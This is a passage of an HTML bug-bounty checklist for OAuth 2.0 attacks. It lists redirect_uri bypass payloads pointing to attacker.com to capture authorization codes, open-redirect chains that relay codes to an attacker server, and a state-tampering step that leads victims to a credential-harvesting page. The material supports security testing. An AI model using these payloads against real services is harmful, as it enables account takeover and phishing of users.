@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Elite OAuth Bug Hunter's Master Checklist</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
+
+  :root {
+    --bg-primary: #05080e;
+    --bg-card: #0b0f1a;
+    --bg-card-hover: #0f1525;
+    --accent-main: #00cfff;
+    --accent-red: #ff3355;
+    --accent-yellow: #ffc233;
+    --accent-green: #00ff88;
+    --accent-purple: #aa55ff;
+    --accent-orange: #ff7733;
+    --accent-pink: #ff55aa;
+    --text-primary: #c8d8e4;
+    --text-dim: #5a7890;
+    --border: #1a2535;
+    --grid: rgba(0,207,255,0.025);
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  body {
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    line-height: 1.6;
+    background-image:
+      linear-gradient(var(--grid) 1px, transparent 1px),
+      linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+    background-size: 40px 40px;
+    min-height: 100vh;
+  }
+
+  /* ─── MISSION BANNER ─── */
+  .mission-banner {
+    background: linear-gradient(90deg, rgba(0,207,255,0.07), rgba(170,85,255,0.07));
+    border-bottom: 1px solid rgba(0,207,255,0.15);
+    text-align: center;
+    padding: 12px 20px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent-main);
+    letter-spacing: 2px;
+  }
+
+  /* ─── HERO ─── */
+  .hero {
+    background: linear-gradient(135deg, #05080e 0%, #080d1c 40%, #05080e 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 60px 20px 52px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute; inset: 0;
+    background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(0,207,255,0.07) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero::after {
+    content: '';
+    position: absolute; bottom: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent-main), transparent);
+  }
+  .hero-tag {
+    display: inline-block;
+    background: rgba(0,207,255,0.08);
+    border: 1px solid rgba(0,207,255,0.35);
+    color: var(--accent-main);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 16px;
+    letter-spacing: 3px;
+    margin-bottom: 20px;
+    animation: pulse-cyan 2.5s ease-in-out infinite;
+  }
+  @keyframes pulse-cyan {
+    0%,100%{ box-shadow: 0 0 0 0 rgba(0,207,255,0.15); }
+    50%{ box-shadow: 0 0 16px 4px rgba(0,207,255,0.15); }
+  }
+  .hero h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(20px, 4vw, 44px);
+    font-weight: 900;
+    letter-spacing: 2px;
+    color: #fff;
+    text-shadow: 0 0 35px rgba(0,207,255,0.35);
+    line-height: 1.2;
+    margin-bottom: 12px;
+  }
+  .hero h1 span { color: var(--accent-main); }
+  .hero-sub {
+    font-family: 'Share Tech Mono', monospace;
+    color: var(--text-dim);
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin-bottom: 30px;
+  }
+  .hero-stats { display: flex; justify-content: center; gap: 40px; flex-wrap: wrap; }
+  .stat { text-align: center; }
+  .stat-num { font-family: 'Orbitron', monospace; font-size: 28px; font-weight: 700; color: var(--accent-main); }
+  .stat-label { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--text-dim); letter-spacing: 2px; }
+
+  /* ─── QUICK NAV ─── */
+  .quick-nav {
+    display: flex; gap: 8px; flex-wrap: wrap; justify-content: center;
+    padding: 18px 20px;
+    background: rgba(0,0,0,0.4);
+    border-bottom: 1px solid var(--border);
+  }
+  .nav-btn {
+    font-family: 'Share Tech Mono', monospace; font-size: 10px;
+    padding: 6px 14px; border: 1px solid var(--border);
+    color: var(--text-dim); cursor: pointer; background: transparent;
+    letter-spacing: 1px; transition: all 0.2s; text-decoration: none; display: inline-block;
+  }
+  .nav-btn:hover { border-color: var(--accent-main); color: var(--accent-main); box-shadow: 0 0 8px rgba(0,207,255,0.15); }
+
+  /* ─── CONTAINER ─── */
+  .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px 80px; }
+
+  /* ─── PROGRESS ─── */
+  .progress-section {
+    background: var(--bg-card); border: 1px solid var(--border); padding: 22px 26px; margin-bottom: 10px;
+  }
+  .progress-header {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 12px;
+    font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); letter-spacing: 1px;
+  }
+  #prog-count { color: var(--accent-main); font-size: 22px; font-family: 'Orbitron', monospace; }
+  .prog-bar-bg { background: rgba(0,0,0,0.6); height: 5px; width: 100%; }
+  .prog-bar-fill {
+    height: 100%; width: 0%;
+    background: linear-gradient(90deg, var(--accent-main), var(--accent-purple));
+    transition: width 0.35s; box-shadow: 0 0 10px rgba(0,207,255,0.4);
+  }
+  .phase-progress {
+    display: grid; grid-template-columns: repeat(6, 1fr); gap: 8px; margin-top: 16px;
+  }
+  @media(max-width:600px){ .phase-progress{ grid-template-columns: repeat(3,1fr); } }
+  .phase-prog-item {
+    text-align: center; padding: 8px 4px;
+    background: rgba(0,0,0,0.4); border: 1px solid var(--border);
+  }
+  .phase-prog-num { font-family: 'Orbitron', monospace; font-size: 15px; color: #fff; }
+  .phase-prog-label { font-family: 'Share Tech Mono', monospace; font-size: 9px; color: var(--text-dim); letter-spacing: 1px; margin-top: 2px; }
+
+  /* ─── PHASE HEADER ─── */
+  .phase-header {
+    display: flex; align-items: center; gap: 18px;
+    margin: 55px 0 24px; padding-bottom: 16px;
+    border-bottom: 1px solid var(--border); position: relative;
+  }
+  .phase-header::after {
+    content: ''; position: absolute; bottom: -1px; left: 0; width: 230px; height: 1px;
+    background: var(--phase-color, var(--accent-main));
+    box-shadow: 0 0 12px var(--phase-color, var(--accent-main));
+  }
+  .phase-badge {
+    background: var(--phase-color, var(--accent-main)); color: #000;
+    font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 700;
+    padding: 6px 14px; letter-spacing: 1px; white-space: nowrap; flex-shrink: 0;
+  }
+  .phase-title { font-family: 'Orbitron', monospace; font-size: clamp(12px, 2vw, 18px); font-weight: 700; color: #fff; }
+  .phase-goal { margin-left: auto; font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); text-align: right; max-width: 260px; }
+  @media(max-width:768px){ .phase-goal{ display:none; } }
+
+  /* ─── CARDS GRID ─── */
+  .cards-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 20px; }
+
+  /* ─── CARD ─── */
+  .card {
+    background: var(--bg-card); border: 1px solid var(--border);
+    opacity: 0; transform: translateY(22px);
+  }
+  .card.visible { opacity:1; transform:translateY(0); transition: opacity 0.5s, transform 0.5s, border-color 0.2s, box-shadow 0.2s; }
+  .card:hover {
+    border-color: var(--card-color, var(--accent-main));
+    box-shadow: 0 0 22px rgba(0,207,255,0.06);
+    transform: translateY(-2px);
+  }
+  .card-header {
+    padding: 15px 18px 12px; border-bottom: 1px solid var(--border);
+    display: flex; align-items: flex-start; gap: 14px;
+  }
+  .report-num {
+    font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 700;
+    color: var(--card-color, var(--accent-main));
+    background: rgba(0,207,255,0.06); border: 1px solid var(--card-color, var(--accent-main));
+    padding: 3px 8px; white-space: nowrap; opacity: 0.9;
+  }
+  .card-title { font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 15px; color: #fff; line-height: 1.3; margin-bottom: 5px; }
+  .card-meta { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+  .badge-cat { font-family: 'Share Tech Mono', monospace; font-size: 9px; padding: 2px 7px; border: 1px solid; letter-spacing: 1px; }
+  .sev-critical { color:#ff3355; border-color:#ff3355; background:rgba(255,51,85,0.08); }
+  .sev-high     { color:#ff7733; border-color:#ff7733; background:rgba(255,119,51,0.08); }
+  .sev-medium   { color:#ffc233; border-color:#ffc233; background:rgba(255,194,51,0.08); }
+  .sev-low      { color:#00aaff; border-color:#00aaff; background:rgba(0,170,255,0.08); }
+  .ref-tag { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--text-dim); padding:2px 7px; border:1px solid var(--border); background:rgba(0,0,0,0.3); }
+
+  .card-body { padding: 16px 18px; }
+
+  /* SCENARIO */
+  .scenario-row {
+    display: flex; gap: 10px; margin-bottom: 14px; padding: 10px 12px;
+    background: rgba(0,0,0,0.35); border-left: 3px solid var(--card-color, var(--accent-main));
+  }
+  .scenario-label { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--card-color,var(--accent-main)); letter-spacing:2px; white-space:nowrap; padding-top:2px; }
+  .scenario-text { font-size:13px; color:var(--text-primary); line-height:1.5; }
+
+  /* STEPS */
+  .steps-title { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--text-dim); letter-spacing:2px; margin-bottom:10px; }
+  .checklist { list-style:none; display:flex; flex-direction:column; gap:7px; margin-bottom:14px; }
+  .checklist li { display:flex; gap:10px; align-items:flex-start; font-size:13px; line-height:1.5; }
+  .check-box {
+    width:16px; height:16px; border:1px solid var(--card-color,var(--accent-main));
+    flex-shrink:0; margin-top:2px; cursor:pointer; transition:background 0.15s; position:relative;
+  }
+  .check-box.done { background: var(--card-color, var(--accent-main)); }
+  .check-box.done::after { content:'✓'; position:absolute; inset:0; display:flex; align-items:center; justify-content:center; font-size:10px; color:#000; font-weight:900; }
+  .check-text { flex:1; }
+  .check-text code { font-family:'Share Tech Mono',monospace; font-size:11px; background:rgba(0,207,255,0.07); border:1px solid rgba(0,207,255,0.2); padding:1px 5px; color:var(--accent-main); }
+  .check-text code.red   { background:rgba(255,51,85,0.07);   border-color:rgba(255,51,85,0.2);   color:var(--accent-red); }
+  .check-text code.yellow{ background:rgba(255,194,51,0.07);  border-color:rgba(255,194,51,0.2);  color:var(--accent-yellow); }
+  .check-text code.green { background:rgba(0,255,136,0.07);   border-color:rgba(0,255,136,0.2);   color:var(--accent-green); }
+  .check-text code.purple{ background:rgba(170,85,255,0.07);  border-color:rgba(170,85,255,0.2);  color:var(--accent-purple); }
+  .check-text code.orange{ background:rgba(255,119,51,0.07);  border-color:rgba(255,119,51,0.2);  color:var(--accent-orange); }
+  .check-text code.pink  { background:rgba(255,85,170,0.07);  border-color:rgba(255,85,170,0.2);  color:var(--accent-pink); }
+
+  /* MINDSET */
+  .mindset {
+    background: rgba(0,0,0,0.45); border: 1px solid rgba(255,194,51,0.2);
+    padding: 11px 14px; margin-top: 4px;
+  }
+  .mindset::before { content:'👑 VETERAN MINDSET'; font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--accent-yellow); letter-spacing:2px; display:block; margin-bottom:6px; }
+  .mindset p { font-size:12px; color:var(--accent-yellow); font-style:italic; line-height:1.6; }
+
+  /* PRO TIP */
+  .pro-tip { background:rgba(0,207,255,0.04); border:1px solid rgba(0,207,255,0.18); padding:10px 13px; margin-top:10px; }
+  .pro-tip::before { content:'💡 PRO TIP'; font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--accent-main); letter-spacing:2px; display:block; margin-bottom:5px; }
+  .pro-tip p { font-size:12px; color:#88ccdd; line-height:1.6; }
+
+  /* ATTACK FLOW */
+  .attack-flow {
+    background: rgba(0,0,0,0.4); border: 1px solid var(--border);
+    padding: 12px 14px; margin-top: 10px;
+  }
+  .attack-flow::before { content:'⚡ ATTACK FLOW'; font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--accent-purple); letter-spacing:2px; display:block; margin-bottom:8px; }
+  .flow-steps { font-family:'Share Tech Mono',monospace; font-size:11px; color:#aaa; line-height:1.8; }
+  .flow-steps .arrow { color:var(--accent-main); }
+  .flow-steps .result { color:var(--accent-red); font-weight:bold; }
+
+  /* ─── CHAIN BOX ─── */
+  .chain-box {
+    background: linear-gradient(135deg, rgba(0,207,255,0.04), rgba(170,85,255,0.04));
+    border: 1px solid rgba(0,207,255,0.2);
+    padding: 34px; margin-top: 55px; text-align: center;
+  }
+  .chain-box h2 { font-family:'Orbitron',monospace; font-size:18px; color:var(--accent-main); margin-bottom:16px; }
+  .chain-formula {
+    font-family:'Share Tech Mono',monospace; font-size:clamp(12px,1.8vw,16px); color:#fff;
+    margin: 20px 0; display:flex; justify-content:center; align-items:center; flex-wrap:wrap; gap:10px;
+  }
+  .chain-formula .part { padding:8px 14px; border:1px solid; }
+  .p1{color:#00cfff;border-color:#00cfff;background:rgba(0,207,255,0.08);}
+  .p2{color:#ffc233;border-color:#ffc233;background:rgba(255,194,51,0.08);}
+  .p3{color:#ff7733;border-color:#ff7733;background:rgba(255,119,51,0.08);}
+  .p4{color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08);}
+  .p5{color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08);}
+  .p6{color:#00ff88;border-color:#00ff88;background:rgba(0,255,136,0.08);}
+  .chain-formula .op { color:var(--accent-main); font-size:22px; }
+  .chain-examples { display:grid; grid-template-columns:repeat(auto-fit,minmax(210px,1fr)); gap:14px; margin-top:22px; text-align:left; }
+  .chain-ex { background:rgba(0,0,0,0.4); border:1px solid var(--border); padding:14px; }
+  .chain-ex-title { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--accent-main); letter-spacing:1px; margin-bottom:8px; }
+  .chain-ex p { font-size:12px; line-height:1.7; }
+  .chain-ex .arrow { color:var(--accent-main); }
+
+  /* ─── MASTER TABLE ─── */
+  .master-table-section { margin-top:55px; }
+  .master-table-section h2 { font-family:'Orbitron',monospace; font-size:17px; color:#fff; margin-bottom:20px; padding-bottom:10px; border-bottom:1px solid var(--border); }
+  .table-wrap { overflow-x:auto; }
+  table { width:100%; border-collapse:collapse; font-size:12px; font-family:'Share Tech Mono',monospace; }
+  thead tr { background:rgba(0,207,255,0.05); border-bottom:2px solid var(--accent-main); }
+  th { padding:10px 14px; text-align:left; color:var(--accent-main); letter-spacing:1px; font-size:10px; }
+  tbody tr { border-bottom:1px solid var(--border); transition:background 0.15s; }
+  tbody tr:hover { background: var(--bg-card-hover, #101525); }
+  td { padding:9px 14px; vertical-align:top; }
+  td:first-child { color:var(--text-dim); }
+  td:nth-child(2) { color:#fff; }
+
+  /* ─── FOOTER ─── */
+  footer {
+    text-align:center; padding:30px 20px;
+    font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--text-dim);
+    border-top:1px solid var(--border); margin-top:60px; letter-spacing:2px;
+  }
+</style>
+</head>
+<body>
+
+<!-- MISSION BANNER -->
+<div class="mission-banner">
+  ✅ MISSION 01: REGISTRATION COMPLETE &nbsp;|&nbsp; ✅ MISSION 02: PASSWORD RESET COMPLETE &nbsp;|&nbsp; ▶ EXECUTING: MISSION 03 — OAuth 2.0 ATTACKS
+</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tag">// MISSION 03: CLASSIFIED //</div>
+  <h1>🔑 <span>OAuth 2.0</span> BUG HUNTER'S<br>MASTER CHECKLIST</h1>
+  <div class="hero-sub">[ 30+ REAL BUG REPORTS · 6 PHASES · 40+ ATTACK VECTORS · WORLD-CLASS SOP ]</div>
+  <div class="hero-stats">
+    <div class="stat"><div class="stat-num">30+</div><div class="stat-label">REPORTS COVERED</div></div>
+    <div class="stat"><div class="stat-num">6</div><div class="stat-label">ATTACK PHASES</div></div>
+    <div class="stat"><div class="stat-num">40+</div><div class="stat-label">TECHNIQUES</div></div>
+    <div class="stat"><div class="stat-num">$$$</div><div class="stat-label">CRITICAL BOUNTIES</div></div>
+  </div>
+</div>
+
+<!-- QUICK NAV -->
+<div class="quick-nav">
+  <a class="nav-btn" href="#phase1">P1: REDIRECT BYPASS</a>
+  <a class="nav-btn" href="#phase2">P2: OPEN REDIRECT CHAIN</a>
+  <a class="nav-btn" href="#phase3">P3: REFERER LEAKAGE</a>
+  <a class="nav-btn" href="#phase4">P4: PARAM POLLUTION & XSS</a>
+  <a class="nav-btn" href="#phase5">P5: LOGIC & REGISTRATION</a>
+  <a class="nav-btn" href="#phase6">P6: TOKEN & STATE ATTACKS</a>
+  <a class="nav-btn" href="#chains">CHAIN ATTACKS</a>
+  <a class="nav-btn" href="#table">ALL REPORTS</a>
+</div>
+
+<div class="container">
+
+<!-- PROGRESS -->
+<div class="progress-section">
+  <div class="progress-header">
+    <span>// MISSION 03 PROGRESS — OAuth 2.0 ATTACK CHECKLIST</span>
+    <span><span id="prog-count">0</span> / 40+ CHECKS COMPLETED</span>
+  </div>
+  <div class="prog-bar-bg"><div class="prog-bar-fill" id="prog-fill"></div></div>
+  <div class="phase-progress">
+    <div class="phase-prog-item"><div class="phase-prog-num" style="color:#00cfff" id="p1d">0</div><div class="phase-prog-label">REDIRECT</div></div>
+    <div class="phase-prog-item"><div class="phase-prog-num" style="color:#ffc233" id="p2d">0</div><div class="phase-prog-label">OPEN REDIR</div></div>
+    <div class="phase-prog-item"><div class="phase-prog-num" style="color:#ff7733" id="p3d">0</div><div class="phase-prog-label">REFERER</div></div>
+    <div class="phase-prog-item"><div class="phase-prog-num" style="color:#aa55ff" id="p4d">0</div><div class="phase-prog-label">HPP / XSS</div></div>
+    <div class="phase-prog-item"><div class="phase-prog-num" style="color:#ff3355" id="p5d">0</div><div class="phase-prog-label">LOGIC</div></div>
+    <div class="phase-prog-item"><div class="phase-prog-num" style="color:#00ff88" id="p6d">0</div><div class="phase-prog-label">TOKEN/STATE</div></div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════════════════════
+     PHASE 1: REDIRECT_URI BYPASS & TOKEN CAPTURE
+══════════════════════════════════════════════════ -->
+<div class="phase-header" id="phase1" style="--phase-color:#00cfff">
+  <div class="phase-badge" style="background:#00cfff">PHASE 01</div>
+  <div class="phase-title">REDIRECT_URI BYPASS — Steal the Authorization Code</div>
+  <div class="phase-goal">Reports #1, #2, #5 · Loose validation exploitation</div>
+</div>
+<div class="cards-grid">
+
+  <!-- R1 -->
+  <div class="card" style="--card-color:#00cfff">
+    <div class="card-header">
+      <div class="report-num">#01</div>
+      <div>
+        <div class="card-title">Folder Traversal in redirect_uri (Reports #1 & #2)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#00cfff;border-color:#00cfff;background:rgba(0,207,255,0.08)">REDIRECT BYPASS</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row">
+        <div class="scenario-label">SCENARIO</div>
+        <div class="scenario-text">OAuth server validates redirect_uri prefix only (e.g., "starts with trusted.com") but doesn't check path — path traversal escapes to attacker domain.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Intercept OAuth authorization request in Burp Suite — find <code>redirect_uri=</code> parameter</div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Try folder traversal: <code>https://trusted.com/callback/../../attacker.com</code></div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Try URL-encoded traversal: <code>https://trusted.com/callback/%2E%2E%2F%2E%2E%2Fattacker.com</code></div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Try double-encoded: <code>https://trusted.com/callback/%252E%252E%252Fattacker.com</code></div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Observe: does browser follow redirect to attacker.com? Check VPS/Burp Collaborator logs</div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Capture: does URL contain <code class="red">code=AUTH_CODE</code> or <code class="red">access_token=TOKEN</code> when it arrives?</div></li>
+      </ul>
+      <div class="attack-flow">
+        <div class="flow-steps">
+          Victim clicks "Login with Google" <span class="arrow">→</span> OAuth server sends code <span class="arrow">→</span> redirect_uri = traversal to attacker.com <span class="arrow">→</span> Code arrives on VPS logs <span class="arrow">→</span> <span class="result">Exchange code for access token → Full ATO</span>
+        </div>
+      </div>
+      <div class="mindset"><p>"OAuth server validates that redirect starts at trusted.com — but where it ENDS is a different story. The path traversal escapes the allowed prefix like a jailbreak."</p></div>
+    </div>
+  </div>
+
+  <!-- R2 -->
+  <div class="card" style="--card-color:#00cfff">
+    <div class="card-header">
+      <div class="report-num">#02</div>
+      <div>
+        <div class="card-title">Subdomain Logic & Character Injection (Report #5)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#00cfff;border-color:#00cfff;background:rgba(0,207,255,0.08)">SUBDOMAIN BYPASS</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row">
+        <div class="scenario-label">SCENARIO</div>
+        <div class="scenario-text">Server validates domain using string matching that can be confused by subdomain placement, fragment injection (#), or special character tricks.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Try subdomain suffix confusion: <code>https://attacker.com.trusted.com</code></div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Try subdomain prefix confusion: <code>https://trusted.com.attacker.com</code></div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Try fragment injection: <code>https://trusted.com%23.attacker.com</code> (browser treats # as fragment → redirects to attacker.com)</div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Try @ injection: <code>https://trusted.com@attacker.com</code> (URL parser: trusted.com = username, attacker.com = host)</div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Try backslash: <code>https://trusted.com\@attacker.com</code> and <code>https://trusted.com\/attacker.com</code></div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Try null byte: <code>https://trusted.com%00attacker.com</code></div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Check VPS logs: which bypass caused the code to arrive on attacker server?</div></li>
+      </ul>
+      <div class="mindset"><p>"URL parsers are inconsistent across languages. What Python sees as trusted.com, JavaScript sees as attacker.com. This inconsistency is the exploit."</p></div>
+      <div class="pro-tip"><p>Use Burp's "Param Miner" to fuzz all redirect_uri variations automatically. Also check if <code>registered_redirect_uris</code> endpoint leaks allowed list — some OAuth servers expose this in discovery docs at <code>/.well-known/oauth-authorization-server</code></p></div>
+    </div>
+  </div>
+
+  <!-- R3 -->
+  <div class="card" style="--card-color:#aa55ff">
+    <div class="card-header">
+      <div class="report-num">#03</div>
+      <div>
+        <div class="card-title">Wildcard & Regex Bypass in redirect_uri</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08)">WILDCARD ABUSE</span>
+          <span class="ref-tag">Phase 1 — Report #12</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#aa55ff">
+        <div class="scenario-label" style="color:#aa55ff">SCENARIO</div>
+        <div class="scenario-text">OAuth server allows wildcard subdomains (*.trusted.com). Any XSS or open redirect on any subdomain becomes a token theft vector.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Check if server allows <code>https://*.trusted.com</code> — test with <code>https://attacker.trusted.com</code></div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Enumerate all subdomains of trusted.com: <code class="purple">subfinder -d trusted.com</code>, <code class="purple">amass enum</code></div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Find any subdomain with: XSS, open redirect, takeover potential (CNAME pointing to unregistered service)</div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Use that vulnerable subdomain as redirect_uri → chain subdomain vuln + OAuth = ATO</div></li>
+        <li><div class="check-box" data-phase="1" onclick="toggleCheck(this)"></div><div class="check-text">Also check: can you REGISTER a new subdomain (e.g., s3.amazonaws.com bucket, GitHub Pages)?</div></li>
+      </ul>
+      <div class="mindset"><p>"*.trusted.com means every subdomain is trusted. Find one subdomain with XSS and you've turned a Medium into a Critical OAuth ATO."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards phase1 -->
+
+
+<!-- ══════════════════════════════════════════════════
+     PHASE 2: OPEN REDIRECT CHAIN ATTACK
+══════════════════════════════════════════════════ -->
+<div class="phase-header" id="phase2" style="--phase-color:#ffc233">
+  <div class="phase-badge" style="background:#ffc233">PHASE 02</div>
+  <div class="phase-title">OPEN REDIRECT CHAIN — Use the App Against Itself</div>
+  <div class="phase-goal">Reports #3, #4, #6 · Chain internal redirect bugs to steal OAuth codes</div>
+</div>
+<div class="cards-grid">
+
+  <!-- R4 -->
+  <div class="card" style="--card-color:#ffc233">
+    <div class="card-header">
+      <div class="report-num">#04</div>
+      <div>
+        <div class="card-title">Open Redirect → OAuth Code Chain (Reports #3, #4)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ffc233;border-color:#ffc233;background:rgba(255,194,51,0.08)">OPEN REDIRECT CHAIN</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ffc233">
+        <div class="scenario-label" style="color:#ffc233">SCENARIO</div>
+        <div class="scenario-text">OAuth server validates redirect_uri strictly — but the main site has an open redirect. Use the open redirect URL AS the redirect_uri. Server trusts it (same domain), then it relays the code to attacker.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">First: find open redirect on main site — test params: <code class="yellow">?redirect=</code>, <code class="yellow">?next=</code>, <code class="yellow">?url=</code>, <code class="yellow">?return_to=</code>, <code class="yellow">?goto=</code></div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Confirm open redirect: <code>https://trusted.com/login?next=https://attacker.com</code> → does it redirect?</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Now in OAuth request: set <code>redirect_uri=https://trusted.com/login?next=https://attacker.com</code></div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">OAuth server validates: "yes, trusted.com domain" → approves it → sends code there</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">trusted.com's open redirect fires → forwards request (WITH code in URL) to attacker.com</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Check attacker VPS logs: full URL with code arrives → exchange for access_token</div></li>
+      </ul>
+      <div class="attack-flow">
+        <div class="flow-steps">
+          OAuth Server <span class="arrow">→</span> trusted.com/login?next=attacker.com <span class="arrow">→</span> Open Redirect fires <span class="arrow">→</span> attacker.com receives ?code=XYZ <span class="arrow">→</span> <span class="result">Token Exchange → Full ATO</span>
+        </div>
+      </div>
+      <div class="mindset"><p>"I don't need to break the OAuth server. I just need to find a weak link in the CHAIN of trust. An open redirect on any trusted page is that weak link."</p></div>
+    </div>
+  </div>
+
+  <!-- R5 -->
+  <div class="card" style="--card-color:#ffc233">
+    <div class="card-header">
+      <div class="report-num">#05</div>
+      <div>
+        <div class="card-title">Post-Login Redirect Abuse (Report #6)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#ffc233;border-color:#ffc233;background:rgba(255,194,51,0.08)">POST-AUTH REDIRECT</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ffc233">
+        <div class="scenario-label" style="color:#ffc233">SCENARIO</div>
+        <div class="scenario-text">After successful OAuth login, the app redirects to a URL stored in session/state. Manipulate that URL to redirect victim post-login to attacker's phishing page.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Observe the <code class="yellow">state</code> parameter in OAuth request — does it encode a return URL?</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Decode state: <code class="yellow">base64_decode(state)</code> — look for <code>{"redirect":"https://app.com/dashboard"}</code></div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Modify: change redirect value to attacker.com → re-encode → replace state parameter</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Send victim the crafted login URL → after OAuth completes → they land on attacker.com</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">At attacker.com: serve fake "session expired, login again" page → harvest credentials</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Also check: <code class="yellow">?returnUrl=</code>, <code class="yellow">?next=</code> parameters appended after callback URL</div></li>
+      </ul>
